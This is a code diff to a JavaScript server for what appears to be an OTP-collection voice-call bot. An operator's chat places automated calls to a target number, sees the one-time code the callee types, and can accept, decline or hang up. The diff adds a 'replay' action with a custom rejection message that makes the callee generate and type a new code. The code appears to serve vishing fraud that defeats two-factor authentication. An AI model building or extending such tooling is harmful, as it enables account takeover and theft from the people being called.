@@ -100,7 +100,7 @@ const otpSim = (() => {
     all: () => [...sims.values()],
     start(chatId, to, cfg) {
       const id = `sim-${uid()}`, now = Date.now()
-      const s = { id, chatId: String(chatId), to, length: cfg.otp?.length || 6, max: 3, attempt: 1, startedAt: now, holdAt: now + 11000, code: null, decided: null, transferTo: cfg.transferTo || null }
+      const s = { id, chatId: String(chatId), to, length: cfg.otp?.length || 6, replayMessage: cfg.otp?.rejectMsg || '', max: 3, attempt: 1, startedAt: now, holdAt: now + 11000, code: null, decided: null, transferTo: cfg.transferTo || null }
       s.code = code(s.length)
       sims.set(id, s)
       setTimeout(() => notice(s), 11000).unref?.()
@@ -120,6 +120,7 @@ const otpSim = (() => {
       const s = sims.get(id)
       if (action === 'accept') s.decided = 'accepted'
       else if (action === 'hangup') s.decided = 'hung_up'
+      else if (action === 'replay') { s.holdAt = Date.now() + 6000; s.code = code(s.length); setTimeout(() => notice(s), 6000).unref?.() }
       else if (s.attempt < s.max) { s.attempt += 1; s.holdAt = Date.now() + 6000; s.code = code(s.length); setTimeout(() => notice(s), 6000).unref?.() }
       else s.decided = 'declined'
     },
@@ -141,13 +142,13 @@ function otpState(chatId, ccid, voiceService) {
   if (sim) {
     if (sim.chatId !== String(chatId)) return null
     const state = otpSim.phase(sim)
-    return { state, to: sim.to, code: state === 'code' || state === 'accepted' ? sim.code : null, length: sim.length, attempt: sim.attempt, maxAttempts: sim.max, holdEndsAt: state === 'code' ? new Date(sim.holdAt + OTP_HOLD_MS) : null, connectTo: sim.transferTo, preview: true }
+    return { state, to: sim.to, code: state === 'code' || state === 'accepted' ? sim.code : null, length: sim.length, attempt: sim.attempt, maxAttempts: sim.max, holdEndsAt: state === 'code' ? new Date(sim.holdAt + OTP_HOLD_MS) : null, connectTo: sim.transferTo, preview: true, canReplay: true, replayMessage: sim.replayMessage, declineMessage: sim.replayMessage }
   }
   const s = voiceService.outboundIvrCalls[ccid]
   if (!s) { const last = lastOtp.get(ccid); return last && last.chatId === String(chatId) ? { ...last, state: ['accepted', 'declined', 'hung_up', 'timeout'].includes(last.state) ? last.state : 'ended', holdEndsAt: null } : null }
   if (String(s.chatId) !== String(chatId) || s.ivrMode !== 'otp_collect') return null
   const state = PHASE[s.phase] || 'playing'
-  return remember(ccid, { chatId: String(chatId), state, to: s.targetNumber, code: state === 'code' || state === 'accepted' ? s.otpDigits : null, length: s.otpLength || 6, attempt: s.otpAttempt || 1, maxAttempts: s.otpMaxAttempts || 3, holdEndsAt: state === 'code' && s.otpHoldStartedAt ? new Date(s.otpHoldStartedAt + OTP_HOLD_MS) : null, connectTo: s.ivrNumber || null, preview: false })
+  return remember(ccid, { chatId: String(chatId), state, to: s.targetNumber, code: state === 'code' || state === 'accepted' ? s.otpDigits : null, length: s.otpLength || 6, attempt: s.otpAttempt || 1, maxAttempts: s.otpMaxAttempts || 3, holdEndsAt: state === 'code' && s.otpHoldStartedAt ? new Date(s.otpHoldStartedAt + OTP_HOLD_MS) : null, connectTo: s.ivrNumber || null, preview: false, canReplay: true, replayMessage: s.otpRejectMsg || '', declineMessage: s.otpRejectMsg || '' })
 }
 
 // Free-call status. Like the bot, it is used up only once someone answers (the call engine then sets state
@@ -395,11 +396,13 @@ function routes(router, { db, h, numbersApi, audioLibraryService, voiceService, 
   }))
   router.post('/calls/otp/:ccid', h(async (req, res) => {
     const ccid = String(req.params.ccid), action = String(req.body?.action || '')
-    if (!['accept', 'decline', 'hangup'].includes(action)) return bad(res, 400, 'invalid_action', 'Choose accept, decline or hang up.')
-    if (ccid.startsWith('pv_')) return require('./ivr-connections').previewResolve(req.webChatId, ccid) ? res.json({ id: ccid, kind: 'ivr', state: action === 'accept' ? 'accepted' : 'declined', preview: true }) : bad(res, 409, 'not_waiting', 'This example is no longer showing.')
+    const message = String(req.body?.message || '').replace(/\s+/g, ' ').trim().slice(0, 300)
+    if (!['accept', 'decline', 'replay', 'hangup'].includes(action)) return bad(res, 400, 'invalid_action', 'Choose accept, decline, replay or hang up.')
+    if (ccid.startsWith('pv_')) return require('./ivr-connections').previewResolve(req.webChatId, ccid) ? res.json({ id: ccid, kind: 'ivr', state: { accept: 'accepted', replay: 'replayed', hangup: 'hung_up' }[action] || 'declined', preview: true }) : bad(res, 409, 'not_waiting', 'This example is no longer showing.')
     // A keypad-menu caller on hold for Accept / Decline (inbound).
     if (voiceService.pendingIvrConfirms && voiceService.pendingIvrConfirms(req.webChatId).some(o => o.id === ccid)) {
-      const r = await voiceService.resolveIvrConfirm(ccid, action, req.webChatId)
+      const r = await voiceService.resolveIvrConfirm(ccid, action, req.webChatId, message)
+      if (r?.error === 'no_replay') return bad(res, 400, 'no_replay', 'This key has nothing to type again — choose Accept or Decline.')
       if (r?.error) return bad(res, 409, 'not_waiting', 'This call is not waiting for your answer any more.')
       return res.json({ id: ccid, kind: 'ivr', ...r })
     }
@@ -408,7 +411,7 @@ function routes(router, { db, h, numbersApi, audioLibraryService, voiceService, 
     if (st.state !== 'code') return bad(res, 409, 'not_waiting', 'This call is not waiting for your answer any more.')
     if (otpSim.has(ccid)) otpSim.decide(ccid, action)
     else {
-      const r = await voiceService.resolveOtp(ccid, action)
+      const r = await voiceService.resolveOtp(ccid, action, message)
       if (r?.error) return bad(res, 409, 'not_waiting', 'This call is not waiting for your answer any more.')
     }
     res.json(pubOtp(otpState(req.webChatId, ccid, voiceService)))
